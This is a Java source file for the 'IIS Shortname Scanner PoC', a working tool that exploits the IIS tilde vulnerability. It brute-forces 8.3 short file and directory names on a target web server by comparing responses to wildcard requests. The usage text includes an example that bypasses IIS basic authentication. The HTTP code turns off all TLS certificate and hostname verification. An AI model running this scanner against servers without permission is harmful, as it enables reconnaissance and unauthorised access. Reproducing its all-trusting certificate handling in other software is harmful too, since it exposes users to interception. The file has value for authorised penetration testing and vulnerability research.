import java.io.Console;
import java.net.*;
import java.util.*;
import javax.net.ssl.*;

public class scanner {
	/* { Custom Config */

	private final static boolean debugMode = true;
	private final static String strVersion = "1.9.4-June2012";
	private final static String customUserAgent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10";
	private final static String customCookie = "IIS_Shortname_Scanner_PoC=1;"; // Your cookie information. Can be a hidden value that will pass your WAF.
	private final static String additionalQuery = "?aspxerrorpath=/"; // In order to see the errors better than a normal request
	private final static String scanList = "0123456789abcdefghijklmnopqrstuvwxyz!#$%&'()-@^_`{}~"; //discard any of these to have more speed!
	private static String proxyServerName = ""; // Proxy will be ignored if this is empty
	private static Integer proxyServerPort = 0;
	private static Long maxDelayAfterEachRequest = (long) 0; // Delay after each request in milliseconds
	/* Custom Config }*/
	/* Do not change the below lines if it's Greek to you!*/
	public Set<String> finalResultsFiles = new TreeSet<String>();
	public Set<String> finalResultsDirs = new TreeSet<String>();
	private String[] arrayScanList = scanList.split("");
	private String[] arrayScanListExt;
	private String[] arrayScanListName;
	private Set<String> scanListName = new TreeSet<String>();
	private Set<String> scanListExtension = new TreeSet<String>();
	private final static String[] marker = {"[-]", "[\\]", "[|]", "[/]"}; // To show the progress
	private static String destURL;
	private static int showProgress;
	private static int concurrentThreads;
	private String magicFileName = "*~1*";
	private String magicFileExtension = "*";
	private String magicFinalPart;
	private String validStatus = "";
	private String invalidStatus = "";
	private int threadCounter = 0;
	private ThreadPool threadPool = new ThreadPool(0);
	private long reqCounter = 0;
	private Proxy proxy;

	public static void main(String[] args) throws Exception {
		// Get URL from input!
		scanner obj = new scanner();

		try {
			if (args.length == 3) {
				if (args[0].equals("0")) {
					showProgress = 0; // Just show the final results
				} else if (args[0].equals("1")) {
					showProgress = 1; // Just show the findings one by one
				} else {
					showProgress = 2; // Show progress
				}
				concurrentThreads = Integer.parseInt(args[1]);
				if (concurrentThreads < 0) {
					concurrentThreads = 0;
				}

				if (concurrentThreads > 0 && showProgress == 2) {
					//showProgress = 1; // Show progress may not work beautifully in Multithread mode but I like it!
				}

				String url = args[2];
				// Basic check for the URL
				if(url.length()<8) throw new Exception(); // URL is too short
				if(url.indexOf("?")>0)
					url = url.substring(0, url.indexOf("?"));
				if(url.indexOf(";")>0)
					url = url.substring(0, url.indexOf(";"));
				if(!url.endsWith("/") && url.lastIndexOf("/")<8)
					url += "/";
				url = url.substring(0, url.lastIndexOf("/")+1);
				if(url.length()<8) throw new Exception(); // URL is too short
				System.out.println("Target = " + url);
				
				Console console = System.console();
				
				// Delay after each request
				String delayMilliseconds = "0";
				if(console!=null){
					delayMilliseconds = console.readLine("How much delay do you want after each request in milliseconds [default=0]?");
					if(!delayMilliseconds.equals("") && obj.isLong(delayMilliseconds)){
						maxDelayAfterEachRequest = Long.parseLong(delayMilliseconds);
						if(maxDelayAfterEachRequest<0){
							maxDelayAfterEachRequest = (long) 0;
						}
					}
				}
				System.out.println("Max delay after each request in milliseconds = " + String.valueOf(maxDelayAfterEachRequest));
				
				// Proxy server setting
				String hasProxy = "No";
				if(console!=null){
					hasProxy = console.readLine("Do you want to use proxy [Y=Yes, Anything Else=No]?");
					if(hasProxy.toLowerCase().equals("y")||hasProxy.toLowerCase().equals("yes")){
						String _proxyServerName = console.readLine("Proxy server Name?");

						String _proxyServerPort = "0";
						if(!_proxyServerName.equals("")){
							_proxyServerPort = console.readLine("Proxy server port?");
							if(!_proxyServerPort.equals("") && obj.isInteger(_proxyServerPort)){
								// We can set the proxy server now
								proxyServerName = _proxyServerName;
								proxyServerPort = Integer.parseInt(_proxyServerPort);
								if(proxyServerPort<=0 || proxyServerPort>65535){
									proxyServerName = "";
									proxyServerPort = 0;
								}
							}
						}
					}
				}
				
				if(!proxyServerName.equals(""))
					System.out.println("\rProxy Server:"+proxyServerName+":"+String.valueOf(proxyServerPort)+"\r\n");
				else
					System.out.println("\rNo proxy has been used.\r\n");
				
				// Beginning...
				Date start_date = new Date();
				System.out.println("\rScanning...\r\n");
				// Start scanning ...
				obj.doScan(url);
				Date end_date = new Date();
				long l1 = start_date.getTime();
				long l2 = end_date.getTime();
				long difference = l2 - l1;
				// ...Finished
				System.out.println("\r\n\rFinished in: " + difference / 1000 + " second(s)");
				
			} else {
				showUsage();
			}

		} catch (Exception err) {
			showUsage();
		}
	}

	private static void showUsage() {
		char[] delim = new char[75];
		Arrays.fill(delim, '*');
		System.out.println("");
		System.out.println(String.valueOf(delim));
		System.out.println("\r\n* IIS Shortname Scanner PoC - 1st release: Dec. 2010\r\n* Finder and Programmer: Soroush Dalili - @irsdl");
		System.out.println("* Credit goes to: Soroush Dalili & Ali Abbasnejad");
		System.out.println("* Paper link: http://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf");
		System.out.println("* Version: " + strVersion);
		System.out.println("* Microsoft has already been informed. However, as it has already been rectified in latest versions of .Net & IIS which follow best practices, Microsoft does not have any plan to change the other versions.");
		System.out.println("* WARNING: We are not responsible for any illegal or malicious usage of the PoC code or this paper. You are only allowed to run the scanner against the websites which you have permission to scan. We do not accept any responsibility for any damage/harm that this application causes to your computer or your network as it is only a proof of concept and may lead to unknown issues. It is your responsibility to use this code legally and you are not allowed to sell this code in any way.\r\n");
		System.out.println(String.valueOf(delim));
		System.out.println("\r\nUSAGE:\r\n java scanner [ShowProgress] [ThreadNumbers] [URL]\r\n");
		System.out.println("DETAILS:");
		System.out.println(" [ShowProgress]: 0= Show final results only - 1= Show final results step by step  - 2= Show Progress");
		System.out.println(" [ThreadNumbers]: 0= No thread - Integer Number = Number of concurrent threads [be careful about IIS Denial of Service]");
		System.out.println(" [URL]: A complete URL - starts with http/https protocol\r\n\r\n");
		System.out.println("- Example 1 (uses no thread - very slow):\r\n java scanner 2 0 http://example.com/folder/new%20folder/\r\n");
		System.out.println("- Example 2 (uses 20 threads - recommended):\r\n java scanner 2 20 http://example.com/folder/new%20folder/\r\n");
		System.out.println("- Example 3 (saves output in a text file):\r\n java scanner 0 20 http://example.com/folder/new%20folder/ > c:\\results.txt\r\n");
		System.out.println("- Example 4 (bypasses IIS basic authentication):\r\n java scanner 2 20 http://example.com/folder/AuthNeeded:$I30:$Index_Allocation/\r\n");
		System.out.println("Note: Sometimes it does not work for the first time and you need to try again.");
	}

	private void doScan(String url) throws Exception {
		destURL = url;
		String[] magicFinalPartList = {"/a.aspx","/a.shtml","/a.asp","/a.asmx","/a.ashx","/a.config","/a.php","/a.jpg","/a.xxx",""};
		boolean isReliableResult = false;
		// Create the proxy string
		if(!proxyServerName.equals("") && !proxyServerPort.equals("")){
			proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyServerName, proxyServerPort));
		}

		for(String s:magicFinalPartList){
			magicFinalPart = s;
			isReliableResult = isReliable();
			if (isReliableResult) {
				if (concurrentThreads == 0) {
					iterateScanFileName("");
				} else {
					scanListPurifier();
					threadPool = new ThreadPool(concurrentThreads);
					incThreadCounter(1);
					threadPool.runTask(multithread_iterateScanFileName(""));
				}
				break;
			}
		}
		if(!isReliableResult)
			System.err.println("Cannot get proper/different error messages from the server. Check the inputs and try again.");

		while (threadCounter != 0) {
			Thread.sleep(1);
		}
		threadPool.join();
		System.out.println("\r\n\r\n--------- Final Result ---------");
		System.out.println(getReqCounter() + " requests have been sent to the server:");
		if (!finalResultsDirs.isEmpty() || !finalResultsFiles.isEmpty()) {
			for (String s : finalResultsDirs) {
				System.out.println("Dir: " + s);
			}

			for (String s : finalResultsFiles) {
				System.out.println("File: " + s);
			}
		}
		System.out.println();
		System.out.println(finalResultsDirs.size() + " Dir(s) was/were found");
		System.out.println(finalResultsFiles.size() + " File(s) was/were found\r\n");

	}

	private void scanListPurifier() {
		try {
			ThreadPool localThreadPool = new ThreadPool(concurrentThreads);
			for (int i = 1; i < arrayScanList.length; i++) {
				localThreadPool.runTask(multithread_NameCharPurifier(arrayScanList[i]));
				localThreadPool.runTask(multithread_ExtensionCharPurifier(arrayScanList[i]));
			}
			localThreadPool.join();
			arrayScanListName=(String[])scanListName.toArray(new String[0]);
			arrayScanListExt=(String[])scanListExtension.toArray(new String[0]);
		} catch (Exception e) {
			if (debugMode) {
				e.printStackTrace();
			}
		}
	}

	private Runnable multithread_NameCharPurifier(final String strInput) throws Exception {
		return new Runnable() {

			public void run() {
				try {
					String statusCode = GetStatus("/*" + strInput + "*~1*" + magicFinalPart); // Should be valid to be added to the list
					if (statusCode.equals("404")) {
						statusCode = GetStatus("/1234567890" + strInput + "*~1*" + magicFinalPart); // It is obviously invalid, but some URL rewriters are sensitive against some characters! 
						if (!statusCode.equals("404")) {
							addValidCharToName(strInput); // Valid character - add it to the list
						}
					}
				} catch (Exception e) {
					if (debugMode) {
						e.printStackTrace();
					}
				}
				decThreadCounter(1);
			}
		};
	}

	private synchronized void addValidCharToName(String strInput) {
		scanListName.add(strInput);
	}

	private Runnable multithread_ExtensionCharPurifier(final String strInput) throws Exception {
		return new Runnable() {

			public void run() {
				try {
					String statusCode = GetStatus("/*~1.*" + strInput + "*" + magicFinalPart); // Should be valid to be added to the list
					if (statusCode.equals("404")) {
						statusCode = GetStatus("/*~1.*" + strInput + "1234567890" + magicFinalPart); // It is obviously invalid, but some URL rewriters are sensitive against some characters!
						if (!statusCode.equals("404")) {
							addValidCharToExtension(strInput); // Valid character - add it to the list
						}
					}
				} catch (Exception e) {
					if (debugMode) {
						e.printStackTrace();
					}
				}
				decThreadCounter(1);
			}
		};
	}

	private synchronized void addValidCharToExtension(String strInput) {
		scanListExtension.add(strInput);
	}

	private Runnable multithread_iterateScanFileName(final String strInput) throws Exception {
		return new Runnable() {

			public void run() {
				try {
					for (int i = 0; i < arrayScanListName.length; i++) {
						String newStr = strInput + arrayScanListName[i];
						//System.out.println(newStr);
						String statusCode = GetStatus("/" + newStr + magicFileName + magicFinalPart);
						String internalMessage = "\r" + marker[i % marker.length] + " " + strInput + arrayScanListName[i].toUpperCase() + "\t\t";
						if (showProgress == 2) {
							System.out.print(internalMessage); // To show the progress! - Just Pretty!
						}
						if (statusCode.equals("404")) {
							//if(showProgress) System.out.print(internalMessage); // Print new characters to show the success! - Just Pretty!
							int isItLastFileName = isItLastFileName(newStr);
							if (isItLastFileName > 0) {
								// Add it to final list
								int counter = 1;
								while (statusCode.equals("404")) {
									String fileName = newStr + "~" + counter;
									// Find Extension
									if (isItFolder(fileName) == 1) {
										if (showProgress > 0) {
											System.out.println("\rDir: " + fileName.toUpperCase() + "\t\t");
										}
										addValidDirToResults(fileName.toUpperCase());
									}
									fileName += ".";
									incThreadCounter(1);
									threadPool.runTask(multithread_iterateScanFileExtension(fileName, ""));
									statusCode = GetStatus("/" + newStr + magicFileName.replace("1", Integer.toString(++counter)) + magicFinalPart);
								}
								if (isItLastFileName == 2) {
									incThreadCounter(1);
									threadPool.runTask(multithread_iterateScanFileName(newStr));
								}
							} else {
								incThreadCounter(1);
								threadPool.runTask(multithread_iterateScanFileName(newStr));
							}
						} else {
							// Ignore it
						}
					}
					if (showProgress == 2) {
						System.out.print("\r\t\t\t\t");
					}

				} catch (Exception e) {
					if (debugMode) {
						e.printStackTrace();
					}
				}
				decThreadCounter(1);
			}
		};
	}

	private void iterateScanFileName(String strInput) throws Exception {
		for (int i = 1; i < arrayScanList.length; i++) {
			String newStr = strInput + arrayScanList[i];
			//System.out.println(newStr);
			String statusCode = GetStatus("/" + newStr + magicFileName + magicFinalPart);
			String internalMessage = "\r" + marker[i % marker.length] + " " + strInput + arrayScanList[i].toUpperCase() + "\t\t";
			if (showProgress == 2) {
				System.out.print(internalMessage); // To show the progress! - Just Pretty!
			}
			if (statusCode.equals("404")) {
				//if(showProgress) System.out.print(internalMessage); // Print new characters to show the success! - Just Pretty!
				int isItLastFileName = isItLastFileName(newStr);
				if (isItLastFileName > 0) {
					// Add it to final list
					int counter = 1;
					while (statusCode.equals("404")) {
						String fileName = newStr + "~" + counter;
						// Find Extension
						if (isItFolder(fileName) == 1) {
							if (showProgress > 0) {
								System.out.println("\rDir: " + fileName.toUpperCase() + "\t\t");
							}
							addValidDirToResults(fileName.toUpperCase());
						}//} else {
						fileName += ".";
						iterateScanFileExtension(fileName, "");
						// }
						statusCode = GetStatus("/" + newStr + magicFileName.replace("1", Integer.toString(++counter)) + magicFinalPart);
					}
					if (isItLastFileName == 2) {
						iterateScanFileName(newStr);
					}
				} else {
					iterateScanFileName(newStr);
				}
			} else {
				// Ignore it
			}
		}
		if (showProgress == 2) {
			System.out.print("\r\t\t\t\t");
		}
	}

	private int isItLastFileName(String strInput) {
		int result = 1; // File is available and there is no more file
		if (strInput.length() < 6) {
			try {
				String statusCode = GetStatus("/" + strInput + "?*~1*" + magicFinalPart);
				if (statusCode.equals("404")) {
					result = 0; // This file is not completed
					statusCode = GetStatus("/" + strInput + "~1*" + magicFinalPart);
					if (statusCode.equals("404")) {
						result = 2; // This file is available but there is more as well
					}
				}
			} catch (Exception err) {
				if (debugMode) {
					err.printStackTrace();
				}
			}
		}
		return result;
	}

	private Runnable multithread_iterateScanFileExtension(final String strFilename, final String strInput) throws Exception {
		return new Runnable() {

			public void run() {
				try {
					for (int i = 0; i < arrayScanListExt.length; i++) {
						String newStr = "";
						newStr = strInput + arrayScanListExt[i];
						String statusCode = GetStatus("/" + strFilename + newStr + magicFileExtension + magicFinalPart);
						String internalMessage = "\r" + marker[i % marker.length] + " " + strFilename + strInput + arrayScanListExt[i].toUpperCase() + "\t\t";
						if (showProgress == 2) {
							System.out.print(internalMessage); // To show the progress! - Just Pretty!
						}
						if (statusCode.equals("404")) {
							//if(showProgress) System.out.print(internalMessage); // Print new characters to show the success! - Just Pretty!
							if (isItLastFileExtension(strFilename + newStr)) {
								// Add it to final list
								String fileName = strFilename + newStr;
								if (showProgress > 0) {
									System.out.println("\rFile: " + fileName.toUpperCase() + "\t\t");
								}
								addValidFileToResults(fileName.toUpperCase());
								if (newStr.length() < 3) {
									incThreadCounter(1);
									threadPool.runTask(multithread_iterateScanFileExtension(strFilename, newStr));
								}
							} else {
								incThreadCounter(1);
								threadPool.runTask(multithread_iterateScanFileExtension(strFilename, newStr));
							}
						} else {
							// Ignore it
						}
					}
					if (showProgress == 2) {
						System.out.print("\r\t\t\t\t");
					}
				} catch (Exception e) {
					if (debugMode) {
						e.printStackTrace();
					}
				}
				decThreadCounter(1);
			}
		};
	}

	private void iterateScanFileExtension(String strFilename, String strInput) throws Exception {
		for (int i = 1; i < arrayScanList.length; i++) {
			String newStr = "";
			newStr = strInput + arrayScanList[i];
			String statusCode = GetStatus("/" + strFilename + newStr + magicFileExtension + magicFinalPart);
			String internalMessage = "\r" + marker[i % marker.length] + " " + strFilename + strInput + arrayScanList[i].toUpperCase() + "\t\t";
			if (showProgress == 2) {
				System.out.print(internalMessage); // To show the progress! - Just Pretty!
			}
			if (statusCode.equals("404")) {
				//if(showProgress) System.out.print(internalMessage); // Print new characters to show the success! - Just Pretty!
				if (isItLastFileExtension(strFilename + newStr)) {
					// Add it to final list
					String fileName = strFilename + newStr;
					if (showProgress > 0) {
						System.out.println("\rFile: " + fileName.toUpperCase() + "\t\t");
					}
					addValidFileToResults(fileName.toUpperCase());
					if (newStr.length() < 3) {
						iterateScanFileExtension(strFilename, newStr);
					}
				} else {
					iterateScanFileExtension(strFilename, newStr);
				}
			} else {
				// Ignore it
			}
		}
		if (showProgress == 2) {
			System.out.print("\r\t\t\t\t");
		}
	}

	private boolean isItLastFileExtension(String strInput) {
		boolean result = false;
		if (strInput.length() <= 12) {
			//System.out.println(strInput);
			int extLength = 3; // default length
			if (strInput.indexOf(".") > 0 && strInput.indexOf(".") != strInput.length() - 1) {
				String[] temp = strInput.split("\\.");
				if (temp[1].length() >= extLength) {
					result = true;
				} else if (GetStatus("/" + strInput + ".*" + magicFinalPart).equals("404")) {
					result = true;
				} else if (!HTTPReqResponse(strInput + magicFinalPart, 0).equals(HTTPReqResponse(strInput + "xxx" + magicFinalPart, 0))) {
					result = true;
				}
			}
			if (!result) {
				try {
					String statusCode = GetStatus("/" + strInput + magicFileExtension + magicFinalPart);
					if (!statusCode.equals("404")) {
						result = true;
					}
				} catch (Exception err) {
					if (debugMode) {
						err.printStackTrace();
					}
					//System.out.println("isItLastFileExtension() Error: " + err.toString());
				}
			}
		}
		//System.out.println(result);
		return result;
	}

	private int isItFolder(String strInput) {
		int result = 0; // No Dir or File
		try {
			String statusCode = GetStatus("/" + strInput + "?" + magicFinalPart);
			if (statusCode.equals("404")) {
				result = 1; // A directory
			}
		} catch (Exception err) {
			if (debugMode) {
				err.printStackTrace();
			}
			//System.out.println("isItFolder() Error: " + err.toString());
		}
		return result;
	}

	private String GetStatus(String strAddition) {
		String status = "";
		try {
			if (!strAddition.startsWith("/")) {
				strAddition = "/" + strAddition;
			}

			strAddition = strAddition.replace("//", "/");

			status = HTTPReqResponse(strAddition, 0);
			//status = HTTPReqResponseSocket(strAddition, 0);

			if (status.equals(validStatus)) {
				status = "404";
			} else {
				status = "400";
			}

		} catch (Exception err) {
			if (debugMode) {
				err.printStackTrace();
			}
			//System.out.println("GetStatus() Error: " + err.toString() + " - Status: " + status);
		}
		return status;
	}

	private boolean isReliable() {
		boolean result = false;
		try {
			validStatus = HTTPReqResponse("/*~1*" + magicFinalPart, 0);
			invalidStatus = HTTPReqResponse("/1234567890*~1*" + magicFinalPart, 0);
			if (!validStatus.equals(invalidStatus)) {
				String tempInvalidStatus = HTTPReqResponse("/0123456789*~1*" + magicFinalPart, 0);
				if (tempInvalidStatus.equals(invalidStatus)) // If two different invalid requests lead to different answers, we cannot rely on the responses!
				{
					result = true;
				}
			}
		} catch (Exception err) {
			if (debugMode) {
				err.printStackTrace();
			}
			//System.out.println("isReliable Error: " + err.toString());
			result = false;
		}
		return result;
	}

	// http://nadeausoftware.com/node/73
	private String HTTPReqResponse(String strAddition, int retryTimes) {
		String finalResponse = "";
		String charset = null;
		Object content = null;
		HttpURLConnection conn = null;
		incReqCounter(1);
		try {
			// Create a trust manager that does not validate certificate chains
			TrustManager[] trustAllCerts = new TrustManager[]{
					new X509TrustManager() {

						public java.security.cert.X509Certificate[] getAcceptedIssuers() {
							return null;
						}

						public void checkClientTrusted(
								java.security.cert.X509Certificate[] certs, String authType) {
						}

						public void checkServerTrusted(
								java.security.cert.X509Certificate[] certs, String authType) {
						}
					}
			};

			// Install the all-trusting trust manager
			try {
				SSLContext sc = SSLContext.getInstance("SSL");
				sc.init(null, trustAllCerts, new java.security.SecureRandom());
				HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
			} catch (Exception e) {
			}

			HttpsURLConnection.setDefaultHostnameVerifier(new HostnameVerifier() {

				public boolean verify(String string, SSLSession ssls) {
					return true;
				}
			});

			URL finalURL = new URL(destURL + URLEncoder.encode(strAddition, "UTF-8")+additionalQuery);

			if(!proxyServerName.equals("") && !proxyServerPort.equals("")){
				// Use the proxy server to sends the requests
				conn = (HttpURLConnection) finalURL.openConnection(proxy);
			}else{
				conn = (HttpURLConnection) finalURL.openConnection();
			}

			conn.setConnectTimeout(10000);    // 10 sec
			conn.setReadTimeout(10000);       // 10 sec
			conn.setInstanceFollowRedirects(false);
			if (!customUserAgent.equals("")) {
				conn.setRequestProperty("User-agent", customUserAgent);
			}
			if (!customCookie.equals("")) {
				conn.setRequestProperty("Cookie", customCookie);
			}

			int length = 0;
			String responseHeaderStatus = "";

			try {
				// Send the request.
				conn.connect();
				Thread.sleep(maxDelayAfterEachRequest); // Delay after each request
				
				// Get the response.
				responseHeaderStatus = conn.getHeaderField(0);

				length = conn.getContentLength();

				content = conn.getContent();
			}catch(java.net.ConnectException e){
				if (debugMode) {
					System.err.println("Error: Connection error. Please check the protocol, the domain name, or the proxy server.");
				}
			} catch (Exception e) {
				// time-out?
			}

			final java.io.InputStream stream = conn.getErrorStream();

			charset = "utf-8";
			// Get the content.

			if (stream != null) {
				content = readStream(length, stream, charset);
				stream.close();
			} else if (content != null && content instanceof java.io.InputStream) {
				content = readStream(length, (java.io.InputStream) content, charset);
			}

			//conn.disconnect();

			if (content == null) {
				finalResponse = "";
			} else {
				finalResponse = content.toString();
				finalResponse = finalResponse.toLowerCase();
				finalResponse = finalResponse.replaceAll("\\\\", "/");
				strAddition = strAddition.replaceAll("\\\\", "/");
				strAddition = strAddition.toLowerCase();
				String[] temp = strAddition.split("/");
				for (int i = 0; i < temp.length; i++) {
					if (temp[i].length() > 0) {
						while (finalResponse.indexOf(temp[i]) > 0) {
							finalResponse = finalResponse.replace(temp[i], "");
						}
					}
				}
				finalResponse = finalResponse.replaceAll("(?im)(([\\n\\r\\x00]+)|((server error in).+>)|((physical path).+>)|((requested url).+>)|((handler<).+>)|((notification<).+>)|(\\://[a-zA-Z0-9\\-\\.]+\\.[a-zA-Z]{2,3}(/\\S*)?)|(<!--[\\w\\W]*?-->)|((content-type)[\\s\\:\\=]+[\\w \\d\\=\\[\\,\\:\\-\\/\\;]*)|((length)[\\s\\:\\=]+[\\w \\d\\=\\[\\,\\:\\-\\/\\;]*)|((tag|p3p|expires|date|age|modified|cookie)[\\s\\:\\=]+[^\\r\\n]*)|([\\:\\-\\/\\ ]\\d{1,4})|(: [\\w\\d, :;=/]+\\W)|(^[\\w\\d, :;=/]+\\W$)|(\\d{1,4}[\\:\\-\\/\\ ]\\d{1,4}))", "");

				finalResponse = responseHeaderStatus.toString() + finalResponse;

			}
		} catch (BindException bindException) {
			try {
				if (conn != null) {
					conn.disconnect();
				}
				if (showProgress == 2 || debugMode) {
					System.out.println("HTTPReqResponse() - Increase your port binding range to get better result -> Wait for 1 seconds...");
				}
				Thread.sleep(1000);
			} catch (Exception err) {
				if (debugMode) {
					err.printStackTrace();
				}
			}
			finalResponse = HTTPReqResponse(strAddition, retryTimes);
		} catch (Exception err) {
			if (conn != null) {
				conn.disconnect();
			}
			retryTimes++;
			if (debugMode) {
				err.printStackTrace();
			}
			if (showProgress == 2 || debugMode) {
				System.out.println("HTTPReqResponse() - Retry: " + Integer.toString(retryTimes));
			}

			if (retryTimes < 5) {
				finalResponse = HTTPReqResponse(strAddition, retryTimes);
			}
		}
		
		return finalResponse;
	}

	private Object readStream(int length, java.io.InputStream stream, String charset)
			throws java.io.IOException {
		final int buflen = Math.max(1024, Math.max(length, stream.available()));
		byte[] buf = new byte[buflen];
		byte[] bytes = null;

		for (int nRead = stream.read(buf); nRead != -1; nRead = stream.read(buf)) {
			if (bytes == null) {
				bytes = buf;
				buf = new byte[buflen];
				continue;
			}
			final byte[] newBytes = new byte[bytes.length + nRead];
			System.arraycopy(bytes, 0, newBytes, 0, bytes.length);
			System.arraycopy(buf, 0, newBytes, bytes.length, nRead);
			bytes = newBytes;
		}

		if (charset == null) {
			return bytes;
		}
		try {
			return new String(bytes, charset);
		} catch (java.io.UnsupportedEncodingException e) {
		}
		return bytes;
	}

	private synchronized void addValidFileToResults(String strInput) {
		finalResultsFiles.add(strInput);
	}

	private synchronized void addValidDirToResults(String strInput) {
		finalResultsDirs.add(strInput);
	}

	private synchronized void incThreadCounter(int num) {
		threadCounter += num;
	}

	private synchronized void decThreadCounter(int num) {
		threadCounter -= num;
		if (threadCounter <= 0) {
			threadCounter = 0;
		}
	}

	private synchronized void incReqCounter(int num) {
		reqCounter += num;
	}

	private synchronized long getReqCounter() {
		return reqCounter;
	}

	private boolean isInteger(String input)
	{
		try
		{
			Integer.parseInt( input );
			return true;
		}
		catch(Exception e)
		{
			return false;
		}
	}

	private boolean isLong(String input)
	{
		try
		{
			Long.parseLong( input );
			return true;
		}
		catch(Exception e)
		{
			return false;
		}
	}
	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	// Copied from: http://www.edparrish.com/cis160/06s/examples/ThreadPool.java
	// Or: http://stackoverflow.com/questions/9700066/how-to-send-data-form-socket-to-serversocket-in-android
	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	static class ThreadPool extends ThreadGroup {

		private boolean isAlive;
		private LinkedList taskQueue;
		private int threadID;
		private static int threadPoolID;

		/**
		 * Creates a new ThreadPool.
		 *
		 * @param numThreads
		 *            The number of threads in the pool.
		 */
		public ThreadPool(int numThreads) {
			super("ThreadPool-" + (threadPoolID++));
			setDaemon(true);

			isAlive = true;

			taskQueue = new LinkedList();
			for (int i = 0; i < numThreads; i++) {
				new PooledThread().start();
			}
		}

		/**
		 * Requests a new task to run. This method returns immediately, and the task
		 * executes on the next available idle thread in this ThreadPool.
		 * <p>
		 * Tasks start execution in the order they are received.
		 *
		 * @param task
		 *            The task to run. If null, no action is taken.
		 * @throws IllegalStateException
		 *             if this ThreadPool is already closed.
		 */
		public synchronized void runTask(Runnable task) {
			if (!isAlive) {
				throw new IllegalStateException();
			}
			if (task != null) {
				taskQueue.add(task);
				notify();
			}

		}

		protected synchronized Runnable getTask() throws InterruptedException {
			while (taskQueue.size() == 0) {
				if (!isAlive) {
					return null;
				}
				wait();
			}
			return (Runnable) taskQueue.removeFirst();
		}

		/**
		 * Closes this ThreadPool and returns immediately. All threads are stopped,
		 * and any waiting tasks are not executed. Once a ThreadPool is closed, no
		 * more tasks can be run on this ThreadPool.
		 */
		public synchronized void close() {
			if (isAlive) {
				isAlive = false;
				taskQueue.clear();
				interrupt();
			}
		}

		/**
		 * Closes this ThreadPool and waits for all running threads to finish. Any
		 * waiting tasks are executed.
		 */
		public void join() {
			// notify all waiting threads that this ThreadPool is no
			// longer alive
			synchronized (this) {
				isAlive = false;
				notifyAll();
			}

			// wait for all threads to finish
			Thread[] threads = new Thread[activeCount()];
			int count = enumerate(threads);
			for (int i = 0; i < count; i++) {
				try {
					threads[i].join();
				} catch (InterruptedException ex) {
				}
			}
		}

		/**
		 * A PooledThread is a Thread in a ThreadPool group, designed to run tasks
		 * (Runnables).
		 */
		private class PooledThread extends Thread {

			public PooledThread() {
				super(ThreadPool.this, "PooledThread-" + (threadID++));
			}

			public void run() {
				while (!isInterrupted()) {

					// get a task to run
					Runnable task = null;
					try {
						task = getTask();
					} catch (InterruptedException ex) {
					}

					// if getTask() returned null or was interrupted,
					// close this thread by returning.
					if (task == null) {
						return;
					}

					// run the task, and eat any exceptions it throws
					try {
						task.run();
					} catch (Throwable t) {
						uncaughtException(this, t);
					}
				}
			}
		}
	}
}
